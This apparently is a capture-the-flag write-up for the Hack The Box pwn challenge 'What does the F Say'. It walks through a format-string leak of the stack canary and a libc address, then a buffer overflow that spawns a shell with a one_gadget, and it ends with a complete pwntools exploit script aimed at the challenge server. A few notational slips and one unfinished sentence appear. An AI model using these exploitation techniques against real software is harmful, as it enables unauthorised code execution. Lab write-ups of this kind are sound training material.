---
description: >-
  Good challenge that uses the format string vulnerability, with a fully
  protected binary.
---

# What does the F Say (HTB)

## Enumeration

There's one binary present from this challenge:

{% code overflow="wrap" %}
```
$ file what_does_the_f_say 
what_does_the_f_say: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=dd622e290e6b1ac53e66369b85805ccd8a593fd0, for GNU/Linux 3.2.0, not stripped
```
{% endcode %}

We can run `checksec` on this to see its protections:

```
gdb-peda$ checksec
Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled off'.

Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled on'.

CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

This binary has ASLR enabled, a Stack Canary (meaning that the , full RELRO (meaning we can't write to the GOT table to change where the `system` function is) and also has a non-executable stack (meaning we can't just inject shellcode, we need to use some ROP chaning somehow).&#x20;

The stack canary means there's some form of stack protection in place. The `rax` value is compared to the Stack Canary value to see if there's been tampering done to the binary. If there is, the application exits.

## Ghidra

We can take a look at the code within `ghidra` to get a better idea of what vulnerabilities are present. Within the `drinks_menu` table, there's a Format String vulnerability:

<figure><img src="../../.gitbook/assets/image (2073).png" alt=""><figcaption></figcaption></figure>

`local_38` is a variable that is user controlled and given a buffer of 40 bytes. It is then directly passed into a `printf` statement, meaning that we can use `%x` to print out values on the stack.

```
$ ./what_does_the_f_say 

Welcome to Fox space bar!

Current space rocks: 69.69

1. Space drinks
2. Space food
1

1. Milky way (4.90 s.rocks)
2. Kryptonite vodka (6.90 s.rocks)
3. Deathstar(70.00 s.rocks)
2

Red or Green Kryptonite?
%x
af28bb30
```

The `warning` function has a buffer overflow vulnerability, since it uses `strcmp` to compare a user-controlled string input.

<figure><img src="../../.gitbook/assets/image (4028).png" alt=""><figcaption></figcaption></figure>

To trigger this function, we just have to buy the products until we have less than 20 space rocks, and then attempt to buy a coloured Kryptonite:

```
Current space rocks: 3.99

1. Space drinks
2. Space food
1

1. Milky way (4.90 s.rocks)
2. Kryptonite vodka (6.90 s.rocks)
3. Deathstar(70.00 s.rocks)
2

Red or Green Kryptonite?
RED
RED

You have less than 20 space rocks! Are you sure you want to buy it?
wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww
*** stack smashing detected ***: terminated
zsh: IOT instruction  ./what_does_the_f_say
```

So there 2 things we need to do:

1. Use the format string vulnerability to leak the stack canary.
2. Use the format string vulnerability to leak the base address of the `libc` library and where it is loaded.
3. Afterwards, abuse Ret2Libc to defeat NX.

## Exploitation

### Leaking Canary

In Linux binaries, the canaries always end with `00`. We can create a simple `for` loop with `pwntools` to the different 'positions' using `$x%p`. `x` in this case is a whole number, and it indicates which 'position' we are leaking (for example, `$7%p` would point to the 7th position).&#x20;

```python
from pwn import *

def canary():
	for i in range(1, 50):
		p = process('./what_does_the_f_say')
		p.recv()
		p.sendline("1")
		p.recv()
		p.sendline("2")
		p.recv()
		p.sendline(f"%{i}$p")	
		print(f"Offset: {i}")
		print(p.recv())
		p.close()

def main():
	canary()
	#libc()
	#shell()

main()
```

We can pipe the output to a file and read the address retrieved from each position. I found that the offset of 23 returned an address ending with 00, which means it must be the stack canary!

<figure><img src="../../.gitbook/assets/image (4043).png" alt=""><figcaption></figcaption></figure>

### Leaking Libc + Finding Libc

Next, we need to figure out a way to leak the `libc` address. My thinking is that this address should come after the stack canary, so I started fuzzing positions after it.&#x20;

```
Red or Green Kryptonite?
%25$p
0x7ffff7dbe480

gdb-peda$ x/gw 0x7ffff7dbe480
0x7ffff7dbe480 <__libc_start_call_main+122>:    0xffe8c789
```

So `libc_start_call_main` is located at position 25. This isn't the `libc` library itself, so we have to use `vmmap` to identify where the library starts being loaded:

```
gdb-peda$ vmmap 
Start              End                Perm      Name
0x0000555555554000 0x0000555555555000 r--p      /home/kali/htb/pwn/what_does_the_f_say
0x0000555555555000 0x0000555555556000 r-xp      /home/kali/htb/pwn/what_does_the_f_say
0x0000555555556000 0x0000555555557000 r--p      /home/kali/htb/pwn/what_does_the_f_say
0x0000555555557000 0x0000555555558000 r--p      /home/kali/htb/pwn/what_does_the_f_say
0x0000555555558000 0x0000555555559000 rw-p      /home/kali/htb/pwn/what_does_the_f_say
0x00007ffff7dbb000 0x00007ffff7dbe000 rw-p      mapped
0x00007ffff7dbe000 0x00007ffff7de4000 r--p      /usr/lib/x86_64-linux-gnu/libc.so.6
```

Using the start address of the first instance of `libc` being loaded, we can calculate the offset to find the base address.

```
>>> hex(-0x7ffff7dbe480 + 0x7ffff7de518a)
'0x26d0a'
```

Since we can leak the `libc_start_main` address of `libc`, we can actually find the exact `libc` being used on the challenge server. Then, we can head to Blukat to find and download the exact library, which we will need in order to spawn a shell on the challenge server.

{% embed url="https://libc.blukat.me/" %}

```
$ python3 exploit.py
[+] Opening connection to 159.65.81.48 on port 30455: Done
[*] Stack Canary: 0xecdcc986acd2a500
[*] Libc_Start: 0x7f2ae943eb97
[*] Closed connection to 159.65.81.48 port 30455
```

<figure><img src="../../.gitbook/assets/image (437).png" alt=""><figcaption></figcaption></figure>

### Exploit

Now that we have defeated the stack canary and found the `libc` address, we need to exploit the Buffer Overflow. We can try to make it work on my local machine before connecting to the server.

First, let's create some code that will trigger the `warning` function.&#x20;

```python
def shell():
	for i in range (10):
		p.recv()
		p.sendline(b"1")
		p.recv()
		p.sendline(b"1")

	p.recv()
	p.sendline(b'1')
	p.recv()
	p.sendline(b'2')
	p.recv()
	p.sendline(b'Red')
	p.recv()
	# send your payload here!
```

We know that the `warning` variable takes a string of input length 24, so let's send that and then the canary:

```python
def shell(canary):
	for i in range (10):
		p.recv()
		p.sendline(b"1")
		p.recv()
		p.sendline(b"1")

	p.recv()
	p.sendline(b'1')
	p.recv()
	p.sendline(b'2')
	p.recv()
	p.sendline(b'Red')
	p.recv()
	
	buffer = b'A' * 24
	buffer += p64(canary)
	p.sendline(buffer)
```

This does not trigger the stack smashing error we found earlier, indicating the canary found works:

<figure><img src="../../.gitbook/assets/image (411).png" alt=""><figcaption></figcaption></figure>

Now, let's send a really long string there and also attach GDB to this process.&#x20;

<pre class="language-python"><code class="lang-python"><strong>gdb.attach(p) # somewhere on top	
</strong><strong>	buffer = b'A' * 24
</strong>	buffer += p64(canary)
	pattern = b'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
	buffer += pattern
	p.sendline(buffer)
	pause()
</code></pre>

When `gdb` pops up, just press `c` to continue the execution. Afterwards, our script will send our string pattern and it will be reflected in the stack values from `gdb`:

<figure><img src="../../.gitbook/assets/image (414).png" alt=""><figcaption></figcaption></figure>

Taking the first 8 characters, we can find the offset:

```
gdb-peda$ pattern offset ABAA$AAn
ABAA$AAn found at offset: 8
```

So we need 8 more rubbish characters. Now, we need to find 3 last things before crafting the rest of the exploit:

1. `pop rdi; ret` gadget
2. `system` function from `libc`
3. `/bin/sh` string from `libc`.

```
$ ROPgadget --binary libc6_2.27-3ubuntu1.2_amd64.so | grep "pop rdi ; ret" 
0x000000000002155f : pop rdi ; ret

$ strings -a -t x libc6_2.27-3ubuntu1.2_amd64.so| grep "/bin/sh"
 1b40fa /bin/sh
 
$ readelf -s libc6_2.27-3ubuntu1.2_amd64.so| grep system  
  1403: 000000000004f4e0    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
```

Great! Now, using this we can easily create our exploit chain.&#x20;

<pre class="language-python"><code class="lang-python"><strong>buffer = b'A' * 24
</strong>buffer += p64(canary)
buffer += b'A' * 8
buffer += p64(pop_rdi)
buffer += p64(binsh)
buffer += p64(system)
p.send(buffer)
p.interactive()
</code></pre>

However, when exploiting it, I always got a segmentation fault on the server:

```
$ python3 exploit.py 
[+] Opening connection to 159.65.81.48 on port 30455: Done
[*] Stack Canary: 0xa9115b9464d11b00
[*] Libc_Start: 0x7fa6a066db97
[*] Libc Base address: 0x7fa6a0643a0d
[*] Switching to interactive mode
Red

You have less than 20 space rocks! Are you sure you want to buy it?
$ id
/home/ctf/run_challenge.sh: line 2:    41 Segmentation fault      ./what_does_the_f_say
[*] Got EOF while reading in interactive
```

We can replace the ROP chain with a `execve("/bin/sh")` argument:

```
$ one_gadget libc6_2.27-3ubuntu1.2_amd64.so 
0x4f365 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
```

Afterwards, the exploit works:

<figure><img src="../../.gitbook/assets/image (443).png" alt=""><figcaption></figcaption></figure>

Final script:

```python
from pwn import *

p = remote('159.65.81.48', 30455)
#p = process('./what_does_the_f_say')
#gdb.attach(p)
def canary():
	p.recv()
	p.sendline(b"1")
	p.recv()
	p.sendline(b"2")
	p.recv()
	p.sendline(b"%23$p")
	p.recvline()
	p.recvline()
	can = p.recvline().strip()
	can = int(can, 16)
	return can

def libc():
	p.recv()
	p.sendline(b"1")
	p.recv()
	p.sendline(b"2")
	p.recv()
	p.sendline(b"%25$p")
	p.recvline()
	p.recvline()
	lib = p.recvline().strip()
	lib = int(lib, 16)
	return lib

def shell(canary, binsh):
	for i in range (10):
		p.recv()
		p.sendline(b"1")
		p.recv()
		p.sendline(b"1")

	p.recv()
	p.sendline(b'1')
	p.recv()
	p.sendline(b'2')
	p.recv()
	p.sendline(b'Red')
	p.recv()
	p.recv()
	
	buffer = b'A' * 24
	buffer += p64(canary)
	buffer += b'A' * 8
	buffer += p64(binsh)
	p.sendline(buffer)
	p.interactive()

def main():
	can = canary()
	log.info(f"Stack Canary: {hex(can)}")
	lib = libc()
	log.info(f"Libc_Start: {hex(lib)}")
	base = lib - 0x021b97
	log.info(f"Libc Base address: {hex(base)}")
	binsh = base + 0x4f365 
	shell(can, binsh)

main()
```
